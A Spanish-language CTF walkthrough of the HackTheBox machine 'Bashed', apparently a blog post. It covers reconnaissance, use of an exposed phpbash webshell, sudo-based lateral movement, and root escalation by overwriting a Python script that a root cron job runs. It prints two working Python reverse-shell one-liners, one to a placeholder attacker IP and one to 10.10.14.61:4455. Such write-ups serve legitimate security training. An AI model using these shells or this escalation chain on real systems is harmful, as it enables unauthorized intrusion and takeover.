---
layout: post
title: "webshell"
date: 2024-02-02
categories: [HTB]
tags: [htb, linux, easy, webshell, web]
difficulty: Easy
excerpt: "Walkthrough de HTB Bashed: acceso mediante webshell phpbash y escalada de privilegios."
---


Recolección de informacion:



        Comencemos con el mapeo del sitio a vulnerar. En esta ocasión observamos en un primer escaneo que sólo tenemos el puerto 80 abierto con el servicio http y una versión de Apache httpd 2.4.18 ((Ubuntu)) corriendo en él. Tratemos de ver si encontramos más puertos TCP abiertos con el comando -p-, pero es el único.  











       Es momento para visualizar la página a ver que nos encontramos. Bien, pues una página simple donde podemos ver la entrada a un artículo. Pinchemos a ver dónde nos lleva el hilo.







        Pues bien nos encontramos con una introducción a una webshell, donde la cual además se encuentra desarrollada en ese servidor. Venga ya, seguro que es un honeypot. Tenemos el enlace al git, continuemos.







        Pero bueno!! Si está todo detallado!! Se me saltan las lágrimas!!!







        Bien dice que se pueden subir y hacer uso de los archivos con sólo cargarlos y lanzarlos desde el navegador. Configuremos nuestra shell y subámoslo.



Explotacion:











       Lanzamos el servidor local y ponemos a netcat a la escucha. Cruzamos los dedos?







        Pues de momento no hay suerte! Subimos el archivo con wget pero para ello debemos cambiar el directorio a /tmp. Seguidamente cambiamos los permisos de ejecución con chmod y tampoco nos lo permite.















        Como vemos que nos estamos bloqueando un poco, debemos pensar en modos mas sencillos de obtener la shell reversa; entonces pensamos -\"y si lanzamos directamente el comando desde la terminal?\". Intentamos en un primer momento con nc pero la versión instalada es nc.openbsd y no consigo la conexión, así que pruebo con python. Introducimos el comando python --versión para ver cuál está instalado y ejecutamos el script directamente. Podemos ver que la consola pierde el prompt.











python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ATACANTE\", PUERTO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'



        Invocamos una shell interactiva con python3 -c 'import pty; pty.spawn(\"/bin/bash\")'







        Cogemos la flag de usuario.







        Si no se especifica ningún comando , la opción -l ( lista ) enumerará lo permitido (y lo prohibido) comandos para el usuario que invoca. Podemos ver que el usuario scriptmanager puede ejecutar sudo sin password en los directorios donde es propietario.



Movimiento lateral:







        Lo primero que haremos será un movimiento lateral, así que cambiamos de usuario invocando el comando sudo -u scriptmanager /bin/bash. Ahora listaremos los directorios raíz donde nos encontraremos el directorio scripts.







        Dentro del directorio tenemos dos documentos: test.py y test.txt. El primero de ellos contiene un script en python y el segundo es un documento .txt donde se refleja lo solicitado en el primer script. Es decir, que ejecuta el contenido del primero con privilegios de root. Pero, cómo nos puede ayudar esto en nuestro ataque?







        Tras búsquedas por consolas infructuosas, decidimos aligerar la búsqueda con la ayuda de una herramienta que nos mostrará todos los procesos del sistema aún sin los privilegios para visualizarlos. La herramienta en cuestión se llama pspy y podemos descargar los archivos desde git.







        Tenemos varias arquitecturas disponibles. Basta con el comando uname-a en la terminal víctima para saber cuál es la correcta.











        Pasamos el archivo a la máquina atacante mediante http.server y damos permisos totales al archivo.







        Tenemos la respuesta a nuestra incógnita: un proceso de ejecución por parte de root donde solicita la lectura del archivo .py alojado en /scripts







Escalada de privilegios:



        Primero crearemos un documento de python donde introduciremos una solicitud de conexión.







import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",4455));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);



        Seguidamente levantaremos nuestro servidor local.







        En la máquina víctima eliminaremos el documento. Subiremos nuestro archivo .py y le otorgaremos privilegios totales.







        En nuestra máquina pondremos a netcat a la escucha y pasado un minuto... tenemos la shell de root. Tan sólo resta leer la flag de root.







        Ahora que somos root podemos listar el crontab para corroborar el proceso que hemos localizado con pspy.







Happy Hacking!!



Referencias:



https://github.com/Arrexel/phpbash



https://explainshell.com/explain?cmd=sudo+-l



https://github.com/DominicBreuker/pspy.git



https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
','Bashed','